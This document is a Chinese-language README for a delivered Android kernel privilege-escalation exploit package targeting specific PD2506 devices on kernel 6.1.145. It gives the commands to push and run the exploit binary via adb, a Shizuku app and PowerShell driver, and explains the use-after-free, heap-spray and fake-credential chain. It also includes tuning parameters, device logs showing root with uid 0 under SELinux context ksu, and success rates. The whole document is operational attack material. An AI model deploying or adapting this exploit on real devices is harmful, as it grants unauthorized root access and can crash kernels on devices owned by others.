# 交付物：POSIX CPU timer LPE（PD2506 / V2506A）

四个文件：

| 文件 | 在哪运行 | 作用 |
| --- | --- | --- |
| `exploit.device` | 手机 | 提权程序本体（aarch64 静态 ELF，zig cc / musl） |
| `run_lpe.sh` | 手机 | 启动脚本：固定离线 harness 验证过的环境变量（唯一来源） |
| `run_lpe.ps1` | 电脑 | 驱动：查设备身份、推送、执行、读取结论、落盘日志 |
| `ic-timer-lpe.apk` | 手机 | 手机端 App：用 Shizuku 拿到 shell 身份后一键推送并运行、日志回显 |

## 支持的内核

| 内核 | 结果 |
| --- | --- |
| `6.1.145-android14-11-g3de37d73fd1d`（本机 16.1.13x） | 真机跑通：run18、run21（交付包复现） |
| `6.1.145-android14-11-gf506252fa70d`（16.1.15.0） | 支持：离线 QEMU 全链跑通（ct16_150，`[helper] cmd euid=0 uid=0 ctx=u:r:ksu:s0`） |

判据是内核行为（mcast 泄漏几何、假 cred、fork/exec 语义）一致；上线前仍建议
在目标机上按 `run_lpe.ps1 -Check` → `-Run` 走一遍。

## 手机 App（APK）

`dev.ic.timerlpe`（minSdk 24 / target 34，本地 debug keystore 签名）。App 自己
是普通应用（uid 随机、`u:r:untrusted_app:s0`），不能碰 `/data/local/tmp`，所以
真正干活的是 **Shizuku 用户服务**（`IcService`）：它运行在 Shizuku 服务器启动
的进程里，身份就是服务器的身份。构建脚本在 `D:\kwork\icapk\build.sh`（纯
aapt2 / aidl / d8 / apksigner，无 Gradle）。

用之前必须满足两点：

1. **Shizuku 要用 shell 身份启动**（ADB 或无线调试），不是 root 启动。root 启动
   的 Shizuku 给出来的用户服务是 uid 0 / `u:r:ksu:s0`，从那里跑提权毫无意义也
   不安全，App 会直接拒绝执行（见下面的身份检查）。
2. 每次完整运行前重启手机（残留的 parked `ic-timer` 进程只能靠重启清理）。

步骤：

```
adb install -r ic-timer-lpe.apk      # 或者直接点安装
# 打开 Shizuku → 通过 ADB / 无线调试启动服务（不要选 root）
# 打开 IC Timer LPE → 连接 Shizuku → 允许授权
# 点“诊断”：应显示 uid=2000、ctx=u:r:shell:s0
# 确认无误后点“推送并运行”
```

App 每次运行用的都是全新文件名：`/data/local/tmp/ic-timer-a<时间戳>`、
`ic-lpe-a<时间戳>.sh`、`ic-app-a<时间戳>.log`，通过 `IC_BIN` 交给
`run_lpe.sh`。这一点是必需的——旧尝试 park 之后仍在执行原来的 ELF，
原地截断会让它们 SIGBUS，垂死的尝试会去遍历被改写的 timer node，直接 panic。

`IcService` 的 `start()` 用 `/system/bin/sh <script>` 拉起脚本，
`PATH=/sbin:/system/bin:/system/xbin`，stdout+stderr 追加到日志文件；App 每秒
用 `length/read` 把新增字节拉回来显示。`推送并运行` 之前会先读一次服务身份，
`uid!=2000` 或上下文不是 `u:r:shell*` 就拒绝（root 启动 Shizuku 的防呆）。

## 用法（电脑脚本）

```powershell
.\run_lpe.ps1 -Check                 # 只看设备身份，不写任何东西
.\run_lpe.ps1 -Run                   # 推送并执行，默认 10 次尝试
.\run_lpe.ps1 -Run -Attempts 40      # 想要更高成功率时
```

也可以完全手动：

```sh
adb push exploit.device /data/local/tmp/ic-timer
adb push run_lpe.sh      /data/local/tmp/run_lpe.sh
adb shell "chmod 0755 /data/local/tmp/ic-timer /data/local/tmp/run_lpe.sh"
adb shell "ATTEMPTS=32 sh /data/local/tmp/run_lpe.sh"
```

只写 `/data/local/tmp` 下的 `ic-*`（shell 拥有），不碰分区、`/data/adb`、boot 镜像。

## 一次尝试做什么（回收 + park）

1. 准备：16 个 worker、候选定时器、A/B 两个僵尸子进程、16 个 socket 的 skb 队列
   （496 MB，order-2）。
2. 回收 A、删掉候选定时器（此后 worker 0 的 base 就指向 stale node `X`）。
3. flush/pool 把 X 的空 slab 从 posix cache 挤到 buddy；`ic_prime_pcp()` 抬高
   `free_factor`，只释放 **8 个** order-2 datagram 触发 pcp 整体排空
   （`IC_SKBF_MIN=8`），而不是在喷射前倒 496 MB 洪水——那正是设备上把 slab
   埋进 `free_area[2]`、喷射接不到的原因。
4. 600 个 socket × 38464 个 `ip6_sf_socklist` 喷射接管 kmalloc-256；
   `SAFE_FILL=4000` 给“slab 还在 posix cache”这一种 miss 兜底；剩下的 skb
   在 fill 之后才释放。
5. 回收 B：`rb_erase` 把 `pc=X` 写进我们的 psl。
6. 扫描 psl：

- **接住** → 走改写链。失败或偏移不支持（31 个里只有 7 个支持）→ **park**：
  不退出、保留 psl socket，把 fill / kept pool / drain pool 占用的
  `RLIMIT_SIGPENDING` 名额还回去，写 `R` 通知父进程；父进程立刻 fork 下一次
  尝试。ct34 里连续 4 次 park 后第 4 次尝试仍能建满 16016+4000 个定时器。
- **没接住** → 若 `/proc/sys/kernel/panic_on_warn` 可读且为 0，正常退出（最多
  一次无害的 `timerqueue_del` WARN）；为 1 或读不到则同样 park，一次 WARN 也
  不留给内核。

park 的进程**永远不要 `kill -9`**：它的 worker 0 的 base 仍指向已被改写的
node，释放任务会让内核沿它走。只能重启清理。每次 park 约 10 MB 内核内存 +
600 个 socket；`ATTEMPTS=16` 最坏留 ~160 MB 给孤儿进程。`SIGHUP/INT/TERM`
都被忽略，关掉 adb 会话不会杀掉它们。

## 成功长什么样

```
[intern] exec write=-1 errno=13 ctx=u:r:ksu:s0
[mcast] case L=0x80 O=1 ...
[ctxmap] u:r:ksu:s0 = sid 56
[helper] cmd euid=0 uid=0 ctx=u:r:ksu:s0
uid=0(root) ... u:r:ksu:s0 ... LPE-PROOF
```

不带 `IC_PAYLOAD_CMD` 时是 `[helper] launched euid=0 ...` +
`[helper] setresuid(0,0,0) ok`；带命令时是 `[helper] cmd`，随后命令的输出接在
同一路 stderr 上。

`[intern] ... errno=13` 是预期内的：那条被拒绝的 `attr/exec` 写只是为了让
`sidtab` 里出现 `u:r:ksu:s0` 的表项，扫描才能按名字找到它。

## 失败模式与诊断

- **设备 2026-10-25 的两次重启**：都停在 `[peak] spray pages=0` 之后，没有任何
  后续行。离线复现的机制是回收 miss：喷射没接住 X 的块时，B 的
  `release_task()` 在 `rb_erase` 里把 SLAB_FREELIST_HARDENED 混淆过的
  freelist 指针当节点用，内核 oops；`CONFIG_PANIC_ON_OOPS=y` 使之直接重启。
  当时喷射前一次性释放 496 MB order-2 datagram，把刚被挤出 posix cache 的
  slab 埋进 `free_area[2]`，喷射只会在更高层分裂，够不到它。
- **修复（已离线验证）**：`IC_SKBF_MIN=8` 只释放 8 个 datagram 触发 pcp 排空，
  其余在 `SAFE_FILL` 之后才释放（日志里的 `[peak] min drain=8/8 skb` /
  `[peak] rest flush=N`）。离线接住率：ct32 3/3，ct33 1/2（另一次成功跑通
  全链），ct34 4/4。
- 残余 miss（离线约 10%）：块被别的 order-1 slab 抢走或仍埋在高阶块里，
  `SAFE_FILL` 覆盖不到；这一种仍可能 oops/重启，属固有概率。run18 的结论是
  窗口内**任何** order-1 slab 分配（filp/dentry/kmalloc-256…）都会抢页，
  所以不要在 flush delete 与喷射之间做任何会分配内存的操作。
- 不支持偏移（31 个里 24 个）现在不会再产生退出 WARN：接住即 park。
- `run_lpe.ps1 -Run` 会只读地记录运行前后的 `/proc/uptime`、
  `panic_on_warn`、buddyinfo 的 order-1 空闲块数、以及运行后残留的
  `ic-timer` 进程数，用来区分**重启（panic）/ 内核卡死 / 进程正常退出**。
  退出码：0 成功；2 本次没有支持的泄漏（可重试）；3 内核故障/重启；
  4 设备不可达。
- 重启不丢数据；等手机回来再跑。**不要 `kill -9`** 残留的 attempt。

## 状态

- **真机成功（2026-10-25 18:11，run18，第 0 次尝试一次命中）**：PD2506，
  uid 2000 / `u:r:shell:s0` / **Enforcing**。
  ```
  [pcp] pre-flush cpu=0 count=1377 high=2259 batch=63
  [slab] post-spray posix_timers_cache 21410 21421 ... slabdata 691
  [mcast] LEAK x=0xffffff80ac87e078 sock=34 group=42 off=0x78 hits=1
  [mcast] case L=0x78 O=0 ord=2218/38464 slab=0xffffff80ac87e000 cred=0xffffff80ac87e118
  [mcast] base written over [2178,2258]
  [mcast] stage1 parked winner=0xffffff825e28bf00
  [mcast] stage2 erased, cred=0xffffff80ac87e118 fake_uid=0xffffff80 img_sid=0xa count=14
  [ctxmap] u:r:ksu:s0 = sid 84
  [helper] cmd euid=0 uid=0 ctx=u:r:ksu:s0
  uid=0(root) gid=0(root) groups=0(root) context=u:r:ksu:s0
  u:r:ksu:s0
  Enforcing
  LPE-PROOF
  [peak] SUCCESS helper=/data/local/tmp/ic-stage/.ic-timer-25851
  ```
  无 panic、无重启，事后 `sys.boot_completed=1`，设备正常。`L=0x78`/`k=0`
  是最好的几何（喷射序号 2218/38464 即拿到 X 的 slab）。
- **第二次真机运行（run19，2026-10-25 18:14，同一份打包配置）：没有崩溃，
  但 10 次尝试都没拿到 root**（`no root after 10 attempts`）。逐次：attempt 0
  泄漏 `L=0x728`（不支持）→ park；attempt 1 超时未完成；attempt 2
  `[mcast] no leak`；attempt 3–9 全是 `chain broke, X holds no candidate:
  parking before reap A`。设备 uptime 连续、`boot_completed=1`，所有 attempt
  都安全 park，没有 WARN/panic。
- **run19 失败的两个原因**：(1) 设备没有重启，run16/run17 遗留的 parked
  attempt 和 run18 成功的进程（25850/25851）占着 order-1 slab 和 uid 2000 的
  `RLIMIT_SIGPENDING`——`fill` 只建到 **2436/4000**，第二次更只剩 **45/4000**；
  (2) 更直接的原因：`IC_ATTEMPT_WAIT=150` 是 **200 ms 为单位的 tick**，即
  30 秒，而真机上一次 attempt 要 30–60 秒才走到喷射；看门狗在 attempt 还在
  跑时就 fork 了下一个，新 attempt 的 order-1 分配（socket、定时器、staging）
  抢走前一个 attempt 的 slab，`chain base` 与 candidates 不再相邻，于是
  attempt 3–9 全部安全地判 `chain broke` 并 park。
- **run20（2026-10-25 18:31，打包驱动的分离式启动）失败并重启**：这次把启动
  改成 `nohup … </dev/null &` 后 adb 会话立即断开，exploit 在 `pre-A` 后
  约 2 秒就整个消失（无 panic）；改成“保持 adb 会话连接 + 开机满 90 秒再跑”
  后，attempt 0 正常走到 `chain base=4805 … d=0/0/0`、`A reaped`、
  `candidates deleted`、`spray objs=38464`、`post-spray count=1603`，但
  **看门狗在 30 秒时又 fork 了 attempt 1**，其分配偷走了已丢弃的 timer slab，
  `posix slabdata 688→687` 却没人接住 X，随后 `reaping B` 时 panic 重启。
  同一份配置在 run18 里 attempt 0 在 30 秒内完成，所以没有暴露这个问题。
  **修复：`IC_ATTEMPT_WAIT` 默认改为 900（180 秒），attempt 永不重叠；
  驱动等待上限相应改为 40 分钟。**
- **run21（2026-10-25 18:35，修好看门狗后的打包驱动，干净设备）：成功，无重启。**
  uptime 158→294 s 连续，2 次尝试：attempt 0 泄漏 `L=0x620`（不支持）→ 立即
  park 并通知父进程；attempt 1 `chain base=4991 … d=0/0/0` → `LEAK off=0x88` →
  `case L=0x88 O=2 ord=482/38464 cred=…de018` → `stage2 erased` →
  `[ctxmap] u:r:ksu:s0 = sid 84` → `[helper] cmd euid=0 uid=0
  ctx=u:r:ksu:s0` → `uid=0(root) … LPE-PROOF` → `[peak] SUCCESS
  helper=…/.ic-timer-8635`。全程 ~136 秒。事后残留 3 个 `ic-timer` 进程
  （attempt 0 的 park、successful attempt 及其 helper），不要 `kill -9`，
  重启回收。
- **操作规则**：每次完整运行前重启手机（parked attempt 的 socket/timer 只能
  重启回收），开机后至少等 90 秒再跑（驱动已自动等待）。
- 打包：`D:\kwork\icbuild\package\ic-lpe.zip`（含本目录的
  `exploit.device`、`run_lpe.sh`、`run_lpe.ps1`、`README.md`）。
- **为什么 run17 只有 1/5（本轮的关键发现）**：`release_posix_timer()` 用
  `call_rcu(&tmr->rcu, k_itimer_rcu_free)` 释放 k_itimer，整板丢弃发生在
  **发起 delete 的那个 CPU 上**的 RCU 回调里（探针 `pcpwho` 实测：该 CPU 的
  Normal pageset count 每丢一板 +2，接近 high 时整页池排空）。`pcp2` 证明
  cpu0 上的 order-1 Unmovable **slab** 分配确实能把这些页取回来
  （2048 次 open → filp，2048/25≈82 板，把 count 拉下 ~164）。也就是说页池和
  时机都对，唯一的问题是 run17 的 `IC_EARLY_GATE` 在那个 1 ms 窗口里 `fopen`
  `/proc/zoneinfo`——`struct file`（filp）和 dentry 都是 order-1 slab，正好把
  X 抢走。修复：gate 改为**预打开 fd 上的 `pread()`**（零分配），并且 run18
  不再等待 drop 出现、喷射在 RCU 回调落地时仍在分配新板。相关新脚本：
  `run18.sh`；探针 `pcpwho` / `pcp2`（只读，无 UAF）。
- 端到端离线验证（2026-10-25，QEMU + 设备自己的 `policy.bin`，
  sha256 `a3825531…`；起始身份 uid 2000 / `u:r:shell:s0` / enforcing）：
  intern → 泄漏 → ctxmap 命中 sid 56 → 预置 payload 在 ksu 域 exec →
  `euid=0`、`setresuid(0,0,0)` 成功 → 干净 `reboot: Power down`。
  最小 drain 配置下重跑（ct33）：第 2 次尝试捕获 `L=0x88` →
  `[mcast] stage2 erased` → `[peak] SUCCESS` → `child status=0x0`。
- park 架构离线验证（ct34，`IC_PARK_TEST=1` 强制每次泄漏后放弃）：
  4/4 次尝试全部 `[mcast] LEAK` → `[peak] attempt parked (X stays in the
  psl)` → 父进程 `parked, retrying`，日志里 **0 条 `WARNING` / 0 次
  `timerqueue`**，4 次尝试用尽后 `no root after 4 attempts`、干净关机。
- 本目录的 `exploit.device` 就是 run18 真机成功所用的构建（zig cc, musl,
  2,427,056 B, sha256 `C422B59300D46166BEE336319AE6A25792F87052FB2BAC21DD09E0AAA06A9B35`）。
- 设备此前几轮（run15 前后）曾因捕获 miss 在 `[peak] fill` 后重启；run17 在
  第 5 次尝试 panic 重启，根因即上面的 gate 抢页，run18 已修复并一次命中。
- 终点是 **euid/fsuid 0 + `u:r:ksu:s0`（该策略里唯一 permissive 的域）**。
  能力集为空：伪 `user_ns` 不在 `init_user_ns` 的祖先链上，`cap_capable()`
  一律 EPERM；要完整 caps 还需要真实的 `init_user_ns` 地址（KASLR 位移）。
  实际可用性：以 root 身份读写 root 自有文件、执行任意程序，绕不过
  “非本人所有且无其它权限”的 DAC 检查。
- 每次尝试只有一个泄漏，31 个节点偏移里只有 7 个可支撑整套改写
  （`L∈0x78..0xa8`，约 22.6%）。没有 `[mcast] case L=` 行就是没撞上，
  换一次运行或多给几次尝试即可。按接住率 ~90% 算，单次尝试成功率约 20%，
  16 次累计约 97%。
- payload 是**一次性**的：命令跑完进程退出，root 不保留（能力集本来就是
  空的）。要做别的事就改 `PAYLOAD_CMD`；例如挂一个长时间的 root 进程，
  让它保持运行需要另做常驻方案。
- 建议在本人设备、已解锁 BL、知情的前提下使用。
